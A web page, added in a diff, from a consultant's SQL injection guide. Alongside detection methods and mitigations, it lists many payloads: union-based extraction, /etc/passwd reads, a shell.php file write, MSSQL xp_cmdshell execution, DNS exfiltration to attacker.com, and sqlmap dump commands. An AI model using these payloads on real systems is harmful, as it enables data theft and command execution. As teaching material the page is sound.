@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQL Injection | Web Security | Saikumar Raju</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    :root { --primary: #00f5a0; --bg-dark: #0a0c10; --bg-card: #111827; --bg-elevated: #1a1f2e; --text-primary: #e8edf5; --text-secondary: #9ca3af; --border: #1f2937; }
+    body.light { --bg-dark: #f3f4f6; --bg-card: #ffffff; --bg-elevated: #e5e7eb; --text-primary: #111827; --text-secondary: #4b5563; --border: #d1d5db; }
+    body { font-family: 'Inter', sans-serif; background: var(--bg-dark); color: var(--text-primary); line-height: 1.6; transition: all 0.3s ease; }
+    .container { max-width: 1300px; margin: 0 auto; padding: 0 2rem; }
+    .navbar { position: sticky; top: 0; background: var(--bg-dark); border-bottom: 1px solid var(--border); padding: 1rem 0; z-index: 100; backdrop-filter: blur(8px); }
+    .nav-flex { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+    .logo { font-size: 1.5rem; font-weight: 700; text-decoration: none; color: var(--text-primary); }
+    .logo span { color: var(--primary); }
+    .nav-links { display: flex; gap: 2rem; list-style: none; align-items: center; flex-wrap: wrap; }
+    .nav-links a { text-decoration: none; color: var(--text-secondary); font-weight: 500; transition: color 0.2s; }
+    .nav-links a:hover { color: var(--primary); }
+    .theme-toggle { background: var(--bg-elevated); border: none; padding: 0.4rem 1rem; border-radius: 40px; cursor: pointer; color: var(--text-primary); display: flex; align-items: center; gap: 0.5rem; font-family: inherit; }
+    .mobile-menu { display: none; background: none; border: none; color: var(--text-primary); font-size: 1.5rem; cursor: pointer; }
+    .page-header { padding: 6rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .page-header h1 { font-size: 2.5rem; font-weight: 700; margin-bottom: 0.5rem; }
+    .severity-badge { display: inline-block; background: rgba(255, 68, 68, 0.2); color: #ff4444; padding: 0.3rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.5rem; margin: 1.5rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; }
+    .content-section h3 { font-size: 1.2rem; margin: 1rem 0 0.5rem; color: var(--text-primary); }
+    .content-section p { margin-bottom: 1rem; color: var(--text-secondary); }
+    .content-section ul, .content-section ol { margin: 1rem 0 1.5rem 2rem; color: var(--text-secondary); }
+    .content-section li { margin-bottom: 0.5rem; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.85rem; color: var(--primary); position: relative; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: none; padding: 0.2rem 0.5rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.7rem; }
+    .copy-btn:hover { color: var(--primary); }
+    .payload-category { margin: 1.5rem 0 1rem; padding: 0.5rem; background: var(--bg-elevated); border-radius: 8px; font-weight: 700; color: var(--primary); }
+    .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 0.8rem; margin: 1rem 0; }
+    .payload-item { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; padding: 0.7rem; font-family: monospace; font-size: 0.75rem; word-break: break-all; }
+    .vulnerability-box { background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box { background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    footer { text-align: center; padding: 2rem; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 0.8rem; }
+    .test-cases { width: 100%; border-collapse: collapse; background: var(--bg-card); border: 1px solid var(--border); margin: 1rem 0; }
+    .test-cases th, .test-cases td { padding: 0.75rem; text-align: left; border-bottom: 1px solid var(--border); }
+    .test-cases th { background: var(--bg-elevated); color: var(--primary); }
+    @media (max-width: 768px) {
+      .container { padding: 0 1rem; }
+      .mobile-menu { display: block; }
+      .nav-links { display: none; width: 100%; flex-direction: column; padding: 1rem 0; gap: 1rem; }
+      .nav-links.show { display: flex; }
+      .page-header h1 { font-size: 1.8rem; }
+      .payload-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar.<span>Raju</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Resume</a></li>
+      <li><a href="../knowledge-base.html">Knowledge Base</a></li>
+      <li><a href="../blog.html">Write-ups</a></li>
+      <li><a href="../tools.html">Tools</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> Dark</button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb"><a href="../knowledge-base.html">Knowledge Base</a> / <a href="index.html">Web Security</a> / SQL Injection</div>
+    <div class="page-header">
+      <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> Critical Severity | OWASP A03:2021</span>
+      <h1>📌 SQL Injection (SQLi) – Basic to Advanced</h1>
+    </div>
+
+    <!-- ==================== DESCRIPTION ==================== -->
+    <div class="content-section">
+      <h2>🧠 Description</h2>
+      <p><strong>What is SQL Injection?</strong></p>
+      <p>SQL Injection is a code injection technique that allows attackers to interfere with the queries an application makes to its database. It occurs when user input is improperly sanitized before being included in SQL queries.</p>
+      <p><strong>Types of SQL Injection:</strong></p>
+      <ul>
+        <li><strong>Error-Based SQLi:</strong> Relies on error messages to extract information</li>
+        <li><strong>Union-Based SQLi:</strong> Uses UNION operator to combine results</li>
+        <li><strong>Boolean-Based Blind SQLi:</strong> Infers information based on true/false responses</li>
+        <li><strong>Time-Based Blind SQLi:</strong> Uses time delays to infer information</li>
+        <li><strong>Out-of-Band SQLi:</strong> Uses DNS or HTTP requests to exfiltrate data</li>
+        <li><strong>Second-Order SQLi:</strong> Payloads stored and executed later</li>
+      </ul>
+      <p><strong>Security principle violated:</strong> Input Validation</p>
+    </div>
+
+    <!-- ==================== CLASSIFICATION ==================== -->
+    <div class="content-section">
+      <h2>🏷️ Classification</h2>
+      <ul>
+        <li><strong>Type:</strong> Injection</li>
+        <li><strong>OWASP:</strong> A03:2021 – Injection</li>
+        <li><strong>CWE:</strong> CWE-89: Improper Neutralization of Special Elements used in an SQL Command</li>
+        <li><strong>CAPEC:</strong> CAPEC-66: SQL Injection</li>
+      </ul>
+    </div>
+
+    <!-- ==================== ATTACK SURFACE ==================== -->
+    <div class="content-section">
+      <h2>🎯 Attack Surface (Where to Test)</h2>
+      <ul>
+        <li>✅ URL parameters (<code>?id=</code>, <code>?user=</code>, <code>?page=</code>)</li>
+        <li>✅ POST body (JSON, form-data, XML, multipart/form-data)</li>
+        <li>✅ Headers (User-Agent, Referer, X-Forwarded-For, Cookie)</li>
+        <li>✅ Cookies / Sessions</li>
+        <li>✅ File uploads (filename injection)</li>
+        <li>✅ API endpoints (REST, GraphQL)</li>
+        <li>✅ Order By / Sort parameters</li>
+        <li>✅ JSON properties, XML nodes</li>
+      </ul>
+    </div>
+
+    <!-- ==================== DETECTION METHODOLOGY ==================== -->
+    <div class="content-section">
+      <h2>🔍 Detection Methodology</h2>
+      <h3>1. Static Analysis (Source Code)</h3>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>// Vulnerable code pattern - String concatenation
+String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
+// Vulnerable PHP
+$query = "SELECT * FROM users WHERE id = " . $_GET['id'];</pre>
+      </div>
+      <h3>2. Dynamic Analysis (Burp Suite / Manual)</h3>
+      <ul>
+        <li>Intercept request and inject single quote (<code>'</code>)</li>
+        <li>Inject double quote (<code>"</code>), backtick (<code>`</code>)</li>
+        <li>Inject <code>' OR '1'='1</code>, <code>' AND SLEEP(5)--</code></li>
+        <li>Observe error messages, response changes, time delays</li>
+      </ul>
+      <p><strong>Tools:</strong> Burp Suite (Repeater, Intruder), SQLmap, OWASP ZAP, FFUF, Nuclei</p>
+    </div>
+
+    <!-- ==================== BASIC PAYLOADS ==================== -->
+    <div class="content-section">
+      <h2>💣 Basic Detection Payloads</h2>
+      <div class="payload-grid">
+        <div class="payload-item">'</div>
+        <div class="payload-item">"</div>
+        <div class="payload-item">`</div>
+        <div class="payload-item">' OR '1'='1</div>
+        <div class="payload-item">' OR '1'='1'--</div>
+        <div class="payload-item">' OR 1=1--</div>
+        <div class="payload-item">' AND 1=1--</div>
+        <div class="payload-item">' AND 1=2--</div>
+      </div>
+    </div>
+
+    <!-- ==================== UNION-BASED PAYLOADS ==================== -->
+    <div class="content-section">
+      <h2>📊 Union-Based Payloads</h2>
+      <div class="payload-grid">
+        <div class="payload-item">' UNION SELECT NULL--</div>
+        <div class="payload-item">' UNION SELECT NULL,NULL--</div>
+        <div class="payload-item">' UNION SELECT 1,2,3--</div>
+        <div class="payload-item">' UNION SELECT database(),user(),version()--</div>
+        <div class="payload-item">' UNION SELECT table_name,NULL FROM information_schema.tables--</div>
+        <div class="payload-item">' UNION SELECT username,password FROM users--</div>
+        <div class="payload-item">' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--</div>
+      </div>
+    </div>
+
+    <!-- ==================== TIME-BASED BLIND ==================== -->
+    <div class="content-section">
+      <h2>⏱️ Time-Based Blind Payloads</h2>
+      <div class="payload-grid">
+        <div class="payload-item">' AND SLEEP(5)-- (MySQL)</div>
+        <div class="payload-item">' WAITFOR DELAY '0:0:5'-- (MSSQL)</div>
+        <div class="payload-item">' || pg_sleep(5)-- (PostgreSQL)</div>
+        <div class="payload-item">' AND dbms_pipe.receive_message('x',5)-- (Oracle)</div>
+      </div>
+    </div>
+
+    <!-- ==================== BOOLEAN-BASED BLIND ==================== -->
+    <div class="content-section">
+      <h2>🎯 Boolean-Based Blind Payloads</h2>
+      <div class="payload-grid">
+        <div class="payload-item">' AND 1=1--</div>
+        <div class="payload-item">' AND 1=2--</div>
+        <div class="payload-item">' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--</div>
+        <div class="payload-item">' AND IF(1=1,1,0)-- (MySQL)</div>
+      </div>
+    </div>
+
+    <!-- ==================== ADVANCED PAYLOADS ==================== -->
+    <div class="content-section">
+      <h2>🚀 Advanced & Database‑Specific Payloads</h2>
+
+      <div class="payload-category">🗄️ MySQL Advanced</div>
+      <div class="payload-grid">
+        <div class="payload-item">' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) --</div>
+        <div class="payload-item">' UNION SELECT 1, 0x62656e6368, 0x70617373776f7264, user() --</div>
+        <div class="payload-item">' AND 1=1 INTO OUTFILE '/var/www/html/shell.php' --</div>
+      </div>
+
+      <div class="payload-category">🏢 MSSQL Advanced</div>
+      <div class="payload-grid">
+        <div class="payload-item">'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami' --</div>
+        <div class="payload-item">'; EXEC xp_dirtree '\\attacker.com\share' -- (DNS exfiltration)</div>
+        <div class="payload-item">'; SELECT 1 WHERE 1=CAST(DB_NAME() AS INT) --</div>
+      </div>
+
+      <div class="payload-category">🐘 PostgreSQL Advanced</div>
+      <div class="payload-grid">
+        <div class="payload-item">' AND 1=CAST((SELECT current_database()) AS INT) --</div>
+        <div class="payload-item">' AND 1=CAST((SELECT inet_server_addr()) AS INT) --</div>
+        <div class="payload-item">' AND 1=CAST((SELECT version()) AS INT) --</div>
+      </div>
+
+      <div class="payload-category">🔶 Oracle Advanced</div>
+      <div class="payload-grid">
+        <div class="payload-item">' UNION SELECT NULL FROM dual WHERE 1=CAST((SELECT ora_database_name FROM dual) AS INT) --</div>
+        <div class="payload-item">' UNION SELECT UTL_INADDR.get_host_address('invalid_host') FROM dual --</div>
+      </div>
+
+      <div class="payload-category">🛡️ WAF Bypass / Obfuscation</div>
+      <div class="payload-grid">
+        <div class="payload-item">%27%20UNION%20SELECT%20NULL--</div>
+        <div class="payload-item">%2527%2520UNION%2520SELECT%2520NULL--</div>
+        <div class="payload-item">UNION/\\*\\*/SELECT/\\*\\*/NULL,NULL</div>
+        <div class="payload-item">UnIoN SeLeCt NULL,NULL</div>
+        <div class="payload-item">' OR 1=1-- -</div>
+      </div>
+    </div>
+
+    <!-- ==================== TEST CASES ==================== -->
+    <div class="content-section">
+      <h2>🧪 Test Cases (STRICT)</h2>
+      <table class="test-cases">
+        <thead><tr><th>Step</th><th>Action</th><th>Expected</th><th>Actual</th></tr></thead>
+        <tbody>
+          <tr><td style="padding: 0.75rem;">1</td><td style="padding: 0.75rem;">Inject <code>'</code></td><td style="padding: 0.75rem;">Error message</td><td style="padding: 0.75rem;">SQL syntax error</td></tr>
+          <tr><td style="padding: 0.75rem;">2</td><td style="padding: 0.75rem;">Inject <code>' OR '1'='1</code></td><td style="padding: 0.75rem;">All records returned</td><td style="padding: 0.75rem;">Authentication bypass</td></tr>
+          <tr><td style="padding: 0.75rem;">3</td><td style="padding: 0.75rem;">Inject <code>' AND SLEEP(5)--</code></td><td style="padding: 0.75rem;">5‑second delay</td><td style="padding: 0.75rem;">Time‑based blind detected</td></tr>
+          <tr><td style="padding: 0.75rem;">4</td><td style="padding: 0.75rem;">Inject <code>' UNION SELECT 1,2,3--</code></td><td style="padding: 0.75rem;">Numbers in response</td><td style="padding: 0.75rem;">Union‑based injection</td></tr>
+        </tbody>
+      </table>
+      <p>✔ Must be reproducible</p>
+    </div>
+
+    <!-- ==================== EXPLOITATION STEPS ==================== -->
+    <div class="content-section">
+      <h2>⚙️ Exploitation Steps</h2>
+      <ol>
+        <li>Identify vulnerable parameter (test with <code>'</code>, <code>"</code>, <code>')</code>).</li>
+        <li>Determine database type (MySQL, PostgreSQL, MSSQL, Oracle) using error messages or version payloads.</li>
+        <li>Use UNION attacks to extract data.</li>
+        <li>Use boolean/time‑based techniques for blind injection.</li>
+        <li>Extract table names, column names, and data.</li>
+        <li>Escalate to file read/write or OS command execution (if applicable).</li>
+        <li>Use SQLmap for automated exploitation.</li>
+      </ol>
+    </div>
+
+    <!-- ==================== MITIGATION ==================== -->
+    <div class="content-section">
+      <h2>🛡️ Mitigation</h2>
+      <div class="mitigation-box">
+        <strong>✅ Parameterized Queries (Prepared Statements):</strong> Always use prepared statements with bound parameters.<br>
+        <strong>✅ Input Validation:</strong> Whitelist allowed characters and validate data types.<br>
+        <strong>✅ Stored Procedures:</strong> Use stored procedures with limited privileges.<br>
+        <strong>✅ Least Privilege:</strong> Database accounts should have minimal required permissions.<br>
+        <strong>✅ WAF:</strong> Deploy Web Application Firewall with SQL injection rules.<br>
+        <strong>✅ Disable Dangerous Functions:</strong> Disable <code>xp_cmdshell</code>, UDF, OLE automation when not needed.
+      </div>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>// Secure implementation (Java - PreparedStatement)
+String query = "SELECT * FROM users WHERE id = ?";
+PreparedStatement stmt = conn.prepareStatement(query);
+stmt.setInt(1, Integer.parseInt(userId));
+ResultSet rs = stmt.executeQuery();
+
+// Python - Parameterized query
+cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
+
+// PHP - PDO
+$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
+$stmt->execute(['id' => $userId]);</pre>
+      </div>
+    </div>
+
+    <!-- ==================== RISK / IMPACT ==================== -->
+    <div class="content-section">
+      <h2>⚠️ Risk / Impact</h2>
+      <div class="vulnerability-box">
+        <strong>Severity: Critical</strong><br><br>
+        <strong>Impact:</strong>
+        <ul>
+          <li>Data breach (usernames, passwords, PII, financial data)</li>
+          <li>Authentication bypass</li>
+          <li>Data manipulation (insert, update, delete)</li>
+          <li>Remote Code Execution (via <code>xp_cmdshell</code>, UDF)</li>
+          <li>Denial of Service (delete tables, drop databases)</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- ==================== PROOF OF CONCEPT ==================== -->
+    <div class="content-section">
+      <h2>📎 Proof of Concept (PoC)</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># SQLmap automated exploitation
+sqlmap -u "https://target.com/page?id=1" --dbs --batch
+sqlmap -u "https://target.com/page?id=1" -D database_name --tables
+sqlmap -u "https://target.com/page?id=1" -D database_name -T users --dump
+
+# Manual exploitation - Authentication bypass
+https://target.com/login?username=admin' OR '1'='1&password=anything
+
+# Manual exploitation - Union-based
+https://target.com/page?id=1' UNION SELECT username,password FROM users--
+
+# MSSQL RCE
+https://target.com/page?id=1'; EXEC xp_cmdshell 'whoami' --</pre>
+      </div>
+    </div>
+
+    <!-- ==================== REFERENCES ==================== -->
+    <div class="content-section">
+      <h2>📚 References & Further Reading</h2>
+      <ul>
+        <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" class="reference-link" target="_blank" style="color: var(--primary);">OWASP: SQL Injection</a></li>
+        <li><a href="https://portswigger.net/web-security/sql-injection" class="reference-link" target="_blank" style="color: var(--primary);">PortSwigger: SQL Injection</a></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" class="reference-link" target="_blank" style="color: var(--primary);">PayloadsAllTheThings: SQL Injection</a></li>
+        <li><a href="https://nav1n0x.gitbook.io/advanced-sql-injection-techniques/" class="reference-link" target="_blank" style="color: var(--primary);">Advanced SQL Injection Techniques (nav1n0x)</a></li>
+      </ul>
+    </div>
+
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
+  </div>
+</main>
+
+<footer><p>Saikumar Raju — Cybersecurity Consultant | SQL Injection - Complete Guide (Basic to Advanced)</p></footer>
+
+<script>
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
+  const themeToggle = document.getElementById('themeToggle'); if (themeToggle) { themeToggle.addEventListener('click', () => { document.body.classList.toggle('light'); const icon = themeToggle.querySelector('i'); if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); themeToggle.innerHTML = '<i class="fas fa-sun"></i> Light'; } else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); themeToggle.innerHTML = '<i class="fas fa-moon"></i> Dark'; } }); }
+  function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.innerText = 'Copied!'; setTimeout(() => { btn.innerText = 'Copy'; }, 2000); }
+</script>
+</body>
+</html>
